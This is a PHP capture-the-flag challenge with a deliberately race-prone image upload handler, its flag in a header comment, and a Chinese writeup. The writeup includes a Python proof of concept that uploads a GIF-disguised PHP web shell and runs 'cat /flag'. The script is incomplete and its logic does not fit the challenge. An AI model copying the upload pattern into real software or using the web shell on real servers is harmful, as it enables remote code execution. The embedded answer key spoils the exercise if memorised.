<?php
/*
 * 题目8: 条件竞争
 * 考察点: 竞态条件、文件上传、临时文件利用
 * 难度: 困难
 * Flag: flag{r4c3_c0nd1t10n_w1n}
 */

error_reporting(0);
session_start();

$upload_dir = __DIR__ . '/uploads/';
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0755, true);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Secure Image Upload</title>
</head>
<body>
<?php
highlight_file(__FILE__);
?>

<h1>Secure Image Upload</h1>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="image" accept="image/*">
    <input type="submit" value="Upload">
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $file = $_FILES['image'];
    
    // 检查是否有错误
    if ($file['error'] !== UPLOAD_ERR_OK) {
        die("Upload error!");
    }
    
    // 检查文件大小
    if ($file['size'] > 1024 * 1024) {
        die("File too large!");
    }
    
    // 生成安全的文件名
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
    
    if (!in_array($ext, $allowed_ext)) {
        die("Only images allowed!");
    }
    
    $new_name = md5(uniqid() . $file['name']) . '.' . $ext;
    $target_path = $upload_dir . $new_name;
    
    // 先移动文件
    if (move_uploaded_file($file['tmp_name'], $target_path)) {
        // 然后检查是否真的是图片
        $image_info = @getimagesize($target_path);
        
        if ($image_info === false) {
            // 不是图片，删除
            unlink($target_path);
            die("Invalid image file!");
        }
        
        // 额外检查文件内容是否包含PHP代码
        $content = file_get_contents($target_path);
        if (preg_match('/<\?php|<\?=|<\?/i', $content)) {
            unlink($target_path);
            die("Suspicious content detected!");
        }
        
        echo "Upload successful: <a href='uploads/$new_name'>$new_name</a>";
    } else {
        echo "Upload failed!";
    }
}
?>

<p>Hint: The server processes uploads in a very "interesting" way...</p>
</body>
</html>
<?php
/*
Writeup:
考察点：条件竞争（Race Condition）

漏洞分析：
代码流程：
1. move_uploaded_file() - 文件被移动到目标目录
2. getimagesize() - 检查是否为图片
3. preg_match() - 检查是否包含PHP代码
4. 如果检查失败 -> unlink() 删除文件

在步骤1和步骤4之间存在时间窗口，可以利用条件竞争！

攻击方法：
1. 上传一个包含PHP代码的图片文件（GIF89a头 + PHP代码）
2. 在文件被删除之前快速访问该文件
3. 使用多线程并发上传和访问

POC脚本 (Python):
```python
import requests
import threading
import time

url_upload = "http://target/index.php"
url_shell = "http://target/uploads/{}"

# 带有PHP代码的假图片
php_content = b"GIF89a<?php system($_GET['cmd']);?>"

def upload():
    while True:
        files = {'image': ('test.gif', php_content, 'image/gif')}
        try:
            r = requests.post(url_upload, files=files, timeout=5)
            if 'Upload successful' in r.text:
                # 提取文件名
                import re
                match = re.search(r'uploads/([a-f0-9]+\.gif)', r.text)
                if match:
                    return match.group(1)
        except:
            pass

def access(filename):
    while True:
        try:
            r = requests.get(url_shell.format(filename) + "?cmd=cat /flag", timeout=1)
            if 'flag{' in r.text:
                print("FLAG FOUND:", r.text)
                return True
        except:
            pass

# 多线程攻击
for i in range(10):
    t1 = threading.Thread(target=upload)
    t1.start()

# 需要猜测或获取文件名，然后快速访问
```

更简单的利用方式：
1. 使用条件竞争的同时，利用PHP_SESSION_UPLOAD_PROGRESS
2. 或者使用Apache .htaccess解析漏洞

实际操作：
1. 准备恶意GIF文件（GIF89a + PHP代码）
2. 使用BurpSuite Intruder或Python脚本持续上传
3. 同时持续尝试访问上传的文件
4. 在删除前成功执行PHP代码

Flag获取：
文件内容：GIF89a<?php echo file_get_contents('/flag');?>
成功访问时会输出：flag{r4c3_c0nd1t10n_w1n}
*/
?>
